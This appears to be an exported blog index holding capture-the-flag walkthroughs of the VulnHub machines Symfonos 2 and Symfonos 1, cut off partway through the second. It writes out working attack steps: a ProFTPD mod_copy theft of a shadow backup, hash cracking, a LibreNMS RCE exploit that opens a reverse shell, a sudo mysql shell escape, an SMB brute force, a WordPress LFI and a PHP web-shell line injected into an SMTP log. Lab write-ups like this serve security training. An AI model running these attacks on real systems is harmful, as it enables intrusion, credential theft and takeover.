Start Time: 2022-01-23 23:50:07 (GMT8)---------------------------------------------------------------------------+ Server: webfs/1.21+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)+ 7916 requests: 1 error(s) and 3 item(s) reported on remote host+ End Time: 2022-01-23 23:50:35 (GMT8) (28 seconds)---------------------------------------------------------------------------+ 1 host(s) tested webfs/1.21TCP/139,445 (SMB)Enum4linux[+] Enumerating users using SID S-1-22-1 and logon username &#39;&#39;, password &#39;&#39; S-1-22-1-1000 Unix User\\aeolus (Local User) S-1-22-1-1001 Unix User\\cronus (Local User) aeolus cronusCrackmapexec + SMBMap┌──(root💀kali)-[~/vulnHub/Symfonos-2/192.168.236.7/exploit]└─# crackmapexec smb $ip -u &#39;&#39; -p &#39;&#39; --sharesSMB 192.168.236.7 445 SYMFONOS2 [*] Windows 6.1 (name:SYMFONOS2)SMB 192.168.236.7 445 SYMFONOS2 [+] \\: SMB 192.168.236.7 445 SYMFONOS2 [+] Enumerated sharesSMB 192.168.236.7 445 SYMFONOS2 Share Permissions SMB 192.168.236.7 445 SYMFONOS2 ----- ----------- SMB 192.168.236.7 445 SYMFONOS2 print$ SMB 192.168.236.7 445 SYMFONOS2 anonymous READ SMB 192.168.236.7 445 SYMFONOS2 IPC$ Service (Samba 4.5.16-Debian)┌──(root💀kali)-[~/vulnHub/Symfonos-2/192.168.236.7/exploit]└─# smbmap -H $ip[+] Guest session IP: 192.168.236.7:445 Name: unknown Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer anonymous READ ONLY IPC$ NO ACCESS IPC Service (Samba 4.5.16-Debian) anonymous, READ ONLYInitial FootholdTCP/80 (HTTP) - No Exploits Proceed to /index.html TCP/139,445 (SMB) Download all files recursively ┌──(root💀kali)-[~/vulnHub/Symfonos-2/192.168.236.7/loot/smb] └─# smbclient //$ip/anonymous -c &#39;prompt;recurse;mget *&#39; Enter WORKGROUP\\root&#39;s password: getting file \\backups\\log.txt of size 11394 as backups/log.txt (1112.7 KiloBytes/sec) (average 1112.7 KiloBytes/sec) ┌──(root💀kali)-[~/vulnHub/Symfonos-2/192.168.236.7/loot/smb] └─# ls backups View backup/log.txt /var/backups/shadow.bak /home/aeolus/share TCP/21 (FTP) - ProFTPD 1.3.5 File Copy Search exploits for ProFTPD 1.3.5 ----------------------------------------------------------------------------------- Exploit Title | Path ----------------------------------------------------------------------------------- ProFTPd 1.3.5 - &#39;mod_copy&#39; Command Execution (Metasploit) | linux/remote/37262.rb ProFTPd 1.3.5 - &#39;mod_copy&#39; Remote Command Execution | linux/remote/36803.py ProFTPd 1.3.5 - &#39;mod_copy&#39; Remote Command Execution (2) | linux/remote/49908.py ProFTPd 1.3.5 - File Copy | linux/remote/36742.txt RCE requires us to have access to a directory Use ProFTPd 1.3.5 - File Copy Exploit Copy /var/backups/shadow.bak to /home/aeolus/share (anonymous share) ┌──(root💀kali)-[~/vulnHub/Symfonos-2/192.168.236.7/exploit] └─# telnet $ip 21 Trying 192.168.236.7... Connected to 192.168.236.7. Escape character is &#39;^]&#39;. 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [192.168.236.7] site cpfr /var/backups/shadow.bak 350 File or directory exists, ready for destination name site cpto /home/aeolus/share/shadow.bak 250 Copy successful Download shadow.bak ┌──(root💀kali)-[~/vulnHub/Symfonos-2/192.168.236.7/loot/smb] └─# smbclient //$ip/anonymous Enter WORKGROUP\\root&#39;s password: Try &quot;help&quot; to get a list of possible commands. smb: \\&amp;gt; get shadow.bak getting file \\shadow.bak of size 1173 as shadow.bak (572.7 KiloBytes/sec) (average 572.8 KiloBytes/sec) smb: \\&amp;gt; Extract hashes ┌──(root💀kali)-[~/vulnHub/Symfonos-2/192.168.236.7/loot/smb] └─# cat shadow.bak | cut -d &quot;:&quot; -f2 | sed &#39;s/*\\|!/ /g&#39; | awk &#39;NF&#39; $6$VTftENaZ$ggY84BSFETwhissv0N6mt2VaQN9k6/HzwwmTtVkDtTbCbqofFO8MVW.IcOKIzuI07m36uy9.565qelr/beHer. $6$dgjUjE.Y$G.dJZCM8.zKmJc9t4iiK9d723/bQ5kE1ux7ucBoAgOsTbaKmp.0iCljaobCntN3nCxsk4DLMy0qTn8ODPlmLG. $6$wOmUfiZO$WajhRWpZyuHbjAbtPDQnR3oVQeEKtZtYYElWomv9xZLOhz7ALkHUT2Wp6cFFg1uLCq49SYel5goXroJ0SxU3D/ sha512crypt (1800) Crack hashes ┌──(root💀kali)-[~/vulnHub/Symfonos-2/192.168.236.7/loot/smb] └─# hashcat -a 0 -m 1800 hashes /usr/share/wordlists/rockyou.txt --show $6$dgjUjE.Y$G.dJZCM8.zKmJc9t4iiK9d723/bQ5kE1ux7ucBoAgOsTbaKmp.0iCljaobCntN3nCxsk4DLMy0qTn8ODPlmLG.:sergioteamo ┌──(root💀kali)-[~/vulnHub/Symfonos-2/192.168.236.7/loot/smb] └─# cat shadow.bak | grep -i mlg aeolus:$6$dgjUjE.Y$G.dJZCM8.zKmJc9t4iiK9d723/bQ5kE1ux7ucBoAgOsTbaKmp.0iCljaobCntN3nCxsk4DLMy0qTn8ODPlmLG.:18095:0:99999:7::: aeolus:sergioteamo TCP/22 (SSH) SSH w/ aeolus:sergioteamo Privilege EscalationCronus - Via LibreNMS CMS Authenticated RCE Ran linpeas 127.0.0.1:8080 apache2 running as cronus Open up the internal service w/ Chisel Kali ┌──(root💀kali)-[~/vulnHub/Symfonos-2/192.168.236.7/loot/smb] └─# chisel server --reverse --port 1337 2022/01/24 00:59:48 server: Reverse tunnelling enabled 2022/01/24 00:59:48 server: Fingerprint zUwTnSwJD7AhStYF+Mrpe5iyr4aIGUEHlvhXnP7dGhk= 2022/01/24 00:59:48 server: Listening on http://0.0.0.0:1337 2022/01/24 01:00:31 server: session#1: Client version (1.7.6) differs from server version (0.0.0-src) 2022/01/24 01:00:31 server: session#1: tun: proxy#R:8888=&amp;gt;8080: Listening Target aeolus@symfonos2:~$ ./chiselLinux64 client 192.168.236.4:1337 R:8888:127.0.0.1:8080 &amp;amp; [1] 2242 aeolus@symfonos2:~$ 2022/01/23 19:00:31 client: Connecting to ws://192.168.236.4:1337 2022/01/23 19:00:31 client: Connected (Latency 1.756904ms) Proceed to localhost:8888, login w/ aeolus:sergioteamo Search exploits for LibreNMS https://shells.systems/librenms-v1-46-remote-code-execution-cve-2018-20434/ php/webapps/47044.py https://www.exploit-db.com/exploits/47044 Obtain Cookies &quot;XSRF-Token=; librenms_session=; PHPSESSID=&quot; Exploit [!] Usage : ./exploit.py http://www.example.com cookies rhost rport ┌──(root💀kali)-[~/vulnHub/Symfonos-2/192.168.236.7/exploit] └─# python 47044.py http://localhost:8888 &quot;XSRF-Token=eyJpdiI6InVYMkhsU3FqQ09NZ2xCeFd4N3RuTEE9PSIsInZhbHVlIjoiS2pmejIzc3lBOVhWallPZlpYQ1J6MzI5YUptQ1pQWFpaWndCdUZDOUV1R0h6bVoyaGZsZnh3RmFVNlZcL25rZ1hYaVQwY01obkg0YUtPTG9MKzRqZVN3PT0iLCJtYWMiOiI0NzVmYmFjNjBhZjI4NDM5YWNiMzY3MTA4ZjE1YzhlNWQxMzY0ODcyMWIwNDkxNmFmZmZiZjg0ODM1MzJlMTA4In0%3D; librenms_session=eyJpdiI6IjV4N1RUR1wveVBBUjliNlRnQWsxdElBPT0iLCJ2YWx1ZSI6ImNWRkN3VnBEbG16eE92bTU1aVBoVEFhQnBnMm5QamEyWWJ3YVV3MzZIY0VOMGxJR3BGN0tVMno0SVVkMmJQaGxPalJNaHJXQU5PK2dhQ0Z4RkxabEJRPT0iLCJtYWMiOiIwOGE1NDQ1MTY3YjJlMGVmZTg5NzZkYWNjYzE1OGZmYmRjMTRlZDU4YTE2MmU5NTNlMjljM2I2MzNjN2RiM2E0In0%3D; PHPSESSID=9e807k9im9sjtqtp5408c58qj4&quot; 192.168.236.4 4444 [+] Device Created Sucssfully ┌──(root💀kali)-[~/vulnHub/Symfonos-2] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 192.168.236.7. Ncat: Connection from 192.168.236.7:46838. /bin/sh: 0: can&#39;t access tty; job control turned off $ whoami; id cronus uid=1001(cronus) gid=1001(cronus) groups=1001(cronus),999(librenms) Root - Via Sudo GTFO Bin Check sudo access cronus@symfonos2:/opt/librenms/html$ sudo -l Matching Defaults entries for cronus on symfonos2: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User cronus may run the following commands on symfonos2: (root) NOPASSWD: /usr/bin/mysql cronus@symfonos2:/opt/librenms/html$ mysql has a GTFO Bin entry Exploit sudo /usr/bin/mysql -e &#39;\\! /bin/sh&#39; Root shell obtained cronus@symfonos2:/opt/librenms/html$ sudo /usr/bin/mysql -e &#39;\\! /bin/sh&#39; # whoami root # cd /root # ls proof.txt # cat proof.txt Congrats on rooting symfonos:2! , , ,-`{-`/ ,-~ , \\ {-~~-, ,~ , ,`,-~~-,`, ,` , { { } } }/ ; ,--/`\\ \\ / / }/ /,/ ; ,-./ \\ \\ { { ( /,; ,/ ,/ ; / ` } } `, `-`-.___ / `, ,/ `,/ \\| ,`,` `~.___,---} / ,`,,/ ,`,; ` { { __ / ,`/ ,`,; / \\ \\ _,`, `{ `,{ `,`;` { } } /~\\ .-:::-. (--, ;\\ `,} `,`; \\\\._./ / /` , \\ ,:::::::::, `~; \\},/ `,`; ,-=- `-..-` /. ` .\\_ ;:::::::::::; __,{ `/ `,`; { / , ~ . ^ `~`\\:::::::::::&amp;lt;&amp;lt;~&amp;gt;-,,`, `-, ``,_ } /~~ . ` . ~ , .`~~\\:::::::; _-~ ;__, `,-` /`\\ /~, . ~ , &#39; ` , .` \\::::;` &amp;lt;&amp;lt;&amp;lt;~``` ``-,,__ ; /` .`\\ /` . ^ , ~ , . ` . ~\\~ \\\\, `,__ / ` , ,`\\. ` ~ , ^ , ` ~ . . ``~~~`, `-`--, \\ / , ~ . ~ \\ , ` . ^ ` , . ^ . , ` .`-,___,---,__ `` /` ` . ~ . ` `\\ ` ~ , . , ` , . ~ ^ , . ~ , .`~---,___ /` . ` , . ~ , \\ ` ~ , . ^ , ~ . ` , ~ . ^ , ~ . `-, Contact me via Twitter @zayotic to give feedback! " }, { "title": "Vulnhub - Symfonos 1", "url": "/posts/Symfonos-1/", "categories": "Vulnhub, Linux", "tags": "tcp/80-http/cms/wordpress-plugin, exploit/file-inclusion/lfi, linux-priv-esc/suid/unknown-exec, linux-priv-esc/suid/path-hijacking", "date": "2022-02-03 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Fri Jan 14 00:34:21 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Symfonos-1/192.168.56.123/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Symfonos-1/192.168.56.123/scans/xml/_full_tcp_nmap.xml 192.168.56.123mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-serversNmap scan report for 192.168.56.123Host is up, received arp-response (0.00051s latency).Scanned at 2022-01-14 00:34:22 +08 for 29sNot shown: 65530 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)| ssh-hostkey: | 2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEgzdI5IpQcFfjqrj7pPhaxTxIJaS0kXjIektEgJg0+jGfOGDi+uaG/pM0Jg5lrOh4BElQFIGDQmf10JrV5CPk/qcs8zPRtKxOspCVBgaQ6wdxjvXkJyDvxinDQzEsg6+uVY2t3YWgTeSPoUP+QC4WWTS/r1e2O2d66SIPzBYVKOP2+WmGMu9MS4tFY15cBTQVilprTBE5xjaO5ToZk+LkBA6mKey4dQyz2/u1ipJKdNBS7XmmjIpyqANoVPoiij5A2XQbCH/ruFfslpTUTl48XpfsiqTKWufcjVO08ScF46wraj1okRdvn+1ZcBV/I7n3BOrXvw8Jxdo9x2pPXkUF| 256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD8/lJjmeqerC3bEL6MffHKMdTiYddhU4dOlT6jylLyyl/tEBwDRNfEhOfc7IZxlkpg4vmRwkU25WdqsTu59+WQ=| 256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOinjerzzjSIgDxhdUgmP/i6nOtGHQq2ayeO1j1h5d5a25/tcp open smtp syn-ack ttl 64 Postfix smtpd|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=symfonos| Subject Alternative Name: DNS:symfonos| Issuer: commonName=symfonos| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2019-06-29T00:29:42| Not valid after: 2029-06-26T00:29:42| MD5: 086e c75b c397 34d6 6293 70cd 6a76 c4f2| SHA-1: e3dc 7293 d59b 3444 d39a 41ef 6fc7 2006 bde4 825f| -----BEGIN CERTIFICATE-----| MIICyzCCAbOgAwIBAgIJAJzTHaEY8CzbMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV| BAMMCHN5bWZvbm9zMB4XDTE5MDYyOTAwMjk0MloXDTI5MDYyNjAwMjk0MlowEzER| MA8GA1UEAwwIc3ltZm9ub3MwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB| AQDMqUx7kERzGuX2GTokAv1cRHV81loI0yEE357TgkGOQEZUA9jpAkceEpjHGdu1| PqfMxETG0TJYdajwYAxr01H5fJmLi04OhKHyKk+yKIRpOO0uU1tvIcpSx5A2QJky| BY+q/82SZLhx/l2xyP2jrc63mz4FSrzav/oPpNT6rxLoPIvJ8z+vnUr3qp5Ea/DH| WRePqBVoMqjqc9EGtwND1EMGJKlZb2KeDaqdJ02K3fZQmyR0+HyYoKq93+sKk34l| 23Q7Tzuq07ZJXHheyN3G6V4uGUmJTGPKTMZlOVyeEo6idPjdW8abEq5ier1k8jWy| IzwTU8GmPe4MR7csKR1omk8bAgMBAAGjIjAgMAkGA1UdEwQCMAAwEwYDVR0RBAww| CoIIc3ltZm9ub3MwDQYJKoZIhvcNAQELBQADggEBAF3kiDg7BrB5xNV+ibk7GUVc| 9J5IALe+gtSeCXCsk6TmEU6l2CF6JNQ1PDisZbC2d0jEEjg3roCeZmDRKFC+NdwM| iKiqROMh3wPMxnHEKgQ2dwGU9UMb4AWdEWzNMtDKVbgf8JgFEuCje0RtGLKJiTVw| e2DjqLRIYwMitfWJWyi6OjdvTWD3cXReTfrjYCRgYUaoMuGahUh8mmyuFjkKmHOR| sMVCO/8UdLvQr7T8QO/682shibBd4B4eekc8aQa7xoEMevSlY8WjtJKbuPvUYsay| slgPCkgga6SRw1X/loPYutfIvK7NQPqcEM8YrWTMokknp7EsJXDl85hRj6GghhE=|_-----END CERTIFICATE-----|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF880/tcp open http syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))|_http-server-header: Apache/2.4.25 (Debian)| http-methods: |_ Supported Methods: HEAD GET POST OPTIONS|_http-title: Site doesn&#39;t have a title (text/html).139/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)MAC Address: 08:00:27:6A:94:16 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=1/14%OT=22%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=61EOS:054AB%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=8OS:)OPS(O1=M5B4ST11NW6%O2=M5B4ST11NW6%O3=M5B4NNT11NW6%O4=M5B4ST11NW6%O5=M5BOS:4ST11NW6%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120OS:)ECN(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%OS:Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0%OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1OS:(R=N)IE(R=Y%DFI=N%TG=40%CD=S)Uptime guess: 198.047 days (since Tue Jun 29 23:26:34 2021)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=262 (Good luck!)IP ID Sequence Generation: All zerosService Info: Hosts: symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: 9h59m58s, deviation: 3h27m51s, median: 7h59m58s| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 46050/tcp): CLEAN (Couldn&#39;t connect)| Check 2 (port 54676/tcp): CLEAN (Couldn&#39;t connect)| Check 3 (port 11022/udp): CLEAN (Timeout)| Check 4 (port 25141/udp): CLEAN (Timeout)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked| smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required| nbstat: NetBIOS name: SYMFONOS, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)| Names:| SYMFONOS&amp;lt;00&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| SYMFONOS&amp;lt;03&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| SYMFONOS&amp;lt;20&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| \\x01\\x02__MSBROWSE__\\x02&amp;lt;01&amp;gt; Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;| WORKGROUP&amp;lt;00&amp;gt; Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;| WORKGROUP&amp;lt;1d&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| WORKGROUP&amp;lt;1e&amp;gt; Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;| Statistics:| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00|_ 00 00 00 00 00 00 00 00 00 00 00 00 00 00| smb-os-discovery: | OS: Windows 6.1 (Samba 4.5.16-Debian)| Computer name: symfonos| NetBIOS computer name: SYMFONOS\\x00| Domain name: \\x00| FQDN: symfonos|_ System time: 2022-01-13T18:34:39-06:00| smb2-time: | date: 2022-01-14T00:34:39|_ start_date: N/A| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)TRACEROUTEHOP RTT ADDRESS1 0.51 ms 192.168.56.123Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Fri Jan 14 00:34:51 2022 -- 1 IP address (1 host up) scanned in 29.89 secondsTCP/80 (HTTP)FFUF┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123]└─# ffuf -u http://192.168.236.8/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,php&#39; -fw 22 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.236.8/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 22________________________________________________ [Status: 200, Size: 328, Words: 48, Lines: 25]index.html [Status: 200, Size: 328, Words: 48, Lines: 25]index.html [Status: 200, Size: 328, Words: 48, Lines: 25]manual [Status: 301, Size: 315, Words: 20, Lines: 10]:: Progress: [18460/18460] :: Job [1/1] :: 7016 req/sec :: Duration: [0:00:03] :: Errors: 0 ::TCP/139,445 (SMB)Enum4linux --------------------------------------| Users via RPC on 192.168.236.8 | --------------------------------------[*] Enumerating users via &#39;querydispinfo&#39;[+] Found 1 users via &#39;querydispinfo&#39;[*] Enumerating users via &#39;enumdomusers&#39;[+] Found 1 users via &#39;enumdomusers&#39;[+] After merging user results we have 1 users total:&#39;1000&#39;: username: helios name: &#39;&#39; acb: &#39;0x00000010&#39; description: &#39;&#39; [+] Enumerating users using SID S-1-22-1 and logon username &#39;&#39;, password &#39;&#39;S-1-22-1-1000 Unix User\\helios (Local User) heliosCrackmapexec+SMBMap┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123]└─# crackmapexec smb $ip -u &#39;&#39; -p &#39;&#39; --sharesSMB 192.168.236.8 445 SYMFONOS Share Permissions SMB 192.168.236.8 445 SYMFONOS ----- ----------- SMB 192.168.236.8 445 SYMFONOS print$ SMB 192.168.236.8 445 SYMFONOS helios SMB 192.168.236.8 445 SYMFONOS anonymous READ SMB 192.168.236.8 445 SYMFONOS IPC$ ┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123]└─# smbmap -H $ip [+] Guest session IP: 192.168.236.8:445 Name: unknown Disk Permissions Comment---- ----------- -------print$ NO ACCESS Printer Drivershelios NO ACCESS Helios personal shareanonymous READ ONLY IPC$ NO ACCESS IPC Service helios anonymous, READInitial FootholdTCP/139,445 (SMB) Fileshare Bruteforce Download all files from anonymous fileshare ┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123/loot] └─# smbclient //$ip/anonymous -c &#39;prompt;recurse;mget *&#39; Enter WORKGROUP\\root&#39;s password: getting file \\attention.txt of size 154 as attention.txt (8.8 KiloBytes/sec) (average 8.8 KiloBytes/sec) View attention.txt Generate username &amp;amp; password wordlist ┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123/loot/smb] └─# cat &amp;gt; usernames.txt &amp;lt;&amp;lt;EOF &amp;gt; helios &amp;gt; Helios &amp;gt; zeus &amp;gt; Zeus &amp;gt; EOF ┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123/loot/smb] └─# cat &amp;gt; passwords.txt &amp;lt;&amp;lt;EOF &amp;gt; epidioko &amp;gt; qwerty &amp;gt; baseball &amp;gt; EOF Bruteforce SMB Fileshare ┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123/loot/smb] └─# ./smb_bruteforce.sh $ip usernames.txt passwords.txt helios Try: helios + epidioko Try: helios + qwerty Found Valid Combination helios:qwerty Try: helios + baseball Try: Helios + epidioko Try: Helios + qwerty Found Valid Combination Helios:qwerty Try: Helios + baseball Try: zeus + epidioko Try: zeus + qwerty Try: zeus + baseball Try: Zeus + epidioko Try: Zeus + qwerty Try: Zeus + baseball Download all files from helios fileshare ┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123] └─# smbclient //$ip/helios -U helios -c &#39;prompt;recurse;mget *&#39; Enter WORKGROUP\\helios&#39;s password: qwerty getting file \\research.txt of size 432 as research.txt (21.1 KiloBytes/sec) (average 21.1 KiloBytes/sec) getting file \\todo.txt of size 52 as todo.txt (25.4 KiloBytes/sec) (average 21.5 KiloBytes/sec) View downloaded files /h3l105 TCP/80 (HTTP) - Wordpress Plugin Exploit Proceed to /h3l105 Wordpress CMS Enumerate wp users ┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123] └─# wpscan --no-update --disable-tls-checks --plugins-detection aggressive --plugins-version-detection aggressive --url http://symfonos.local/h3l105 -e ap -f cli-no-color 2&amp;gt;&amp;amp;1 | tee &quot;/root/vulnHub/Symfonos-1/192.168.56.123/scans/tcp80/tcp80_http_wpscan_plugin_enum.txt&quot; [i] User(s) Identified: [+] admin | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http://symfonos.local/h3l105/index.php/wp-json/wp/v2/users/?per_page=100&amp;amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) Enumerate wp plugins ┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123] └─# wpscan --no-update --disable-tls-checks --plugins-detection aggressive --plugins-version-detection aggressive --url http://symfonos.local/h3l105 -e ap -f cli-no-color 2&amp;gt;&amp;amp;1 | tee &quot;/root/vulnHub/Symfonos-1/192.168.56.123/scans/tcp80/tcp80_http_wpscan_plugin_enum.txt&quot; [i] Plugin(s) Identified: [+] akismet | Location: http://symfonos.local/h3l105/wp-content/plugins/akismet/ | Last Updated: 2021-10-01T18:28:00.000Z | Readme: http://symfonos.local/h3l105/wp-content/plugins/akismet/readme.txt | [!] The version is out of date, the latest version is 4.2.1 | | Found By: Known Locations (Aggressive Detection) | - http://symfonos.local/h3l105/wp-content/plugins/akismet/, status: 200 | | Version: 4.1.2 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://symfonos.local/h3l105/wp-content/plugins/akismet/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://symfonos.local/h3l105/wp-content/plugins/akismet/readme.txt [+] mail-masta | Location: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/ | Latest Version: 1.0 (up to date) | Last Updated: 2014-09-19T07:52:00.000Z | Readme: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt | [!] Directory listing is enabled | | Found By: Known Locations (Aggressive Detection) | - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/, status: 200 | | Version: 1.0 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt [+] site-editor | Location: http://symfonos.local/h3l105/wp-content/plugins/site-editor/ | Latest Version: 1.1.1 (up to date) | Last Updated: 2017-05-02T23:34:00.000Z | Readme: http://symfonos.local/h3l105/wp-content/plugins/site-editor/readme.txt | | Found By: Known Locations (Aggressive Detection) | - http://symfonos.local/h3l105/wp-content/plugins/site-editor/, status: 200 | | Version: 1.1.1 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://symfonos.local/h3l105/wp-content/plugins/site-editor/readme.txt site-editor 1.1.1 mail-masta 1.0 Search exploits for site-editor 1.1.1 ┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123/loot/smb] └─# searchsploit site editor wordpress ---------------------------------------------------------------------------------- |Exploit Title | Path ---------------------------------------------------------------------------------- WordPress Plugin Site Editor 1.1.1 - Local File Inclusion | php/webapps/44340.txt ---------------------------------------------------------------------------------- Seach exploits for mail-masta 1.0 ┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123/loot/smb] └─# searchsploit wordpress mail masta ----------------------------------------------------------------------------------- | Exploit Title | Path ----------------------------------------------------------------------------------- WordPress Plugin Mail Masta 1.0 - Local File Inclusion | php/webapps/40290.txt WordPress Plugin Mail Masta 1.0 - Local File Inclusion (2) | php/webapps/50226.py WordPress Plugin Mail Masta 1.0 - SQL Injection | php/webapps/41438.txt ----------------------------------------------------------------------------------- Use WordPress Plugin Mail Masta 1.0 - Local File Inclusion Exploitable parameter http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=&amp;lt;LFI File&amp;gt; Include /etc/passwd Since SMTP TCP/25 is up, poison SMTP log ┌──(root💀kali)-[~/vulnHub/Symfonos-1/192.168.56.123/loot/smb] └─# telnet $ip 25 Trying 192.168.236.8... Connected to 192.168.236.8. Escape character is &#39;^]&#39;. 220 symfonos.localdomain ESMTP Postfix (Debian/GNU) MAIL FROM:asdf RCPT TO: helios DATA &amp;lt;?php system($_GET[&#39;c&#39;]); ?&amp;gt; . QUIT250 2.1.0 Ok 250 2.1.5 Ok 354 End data with &amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt;.&amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt; 250 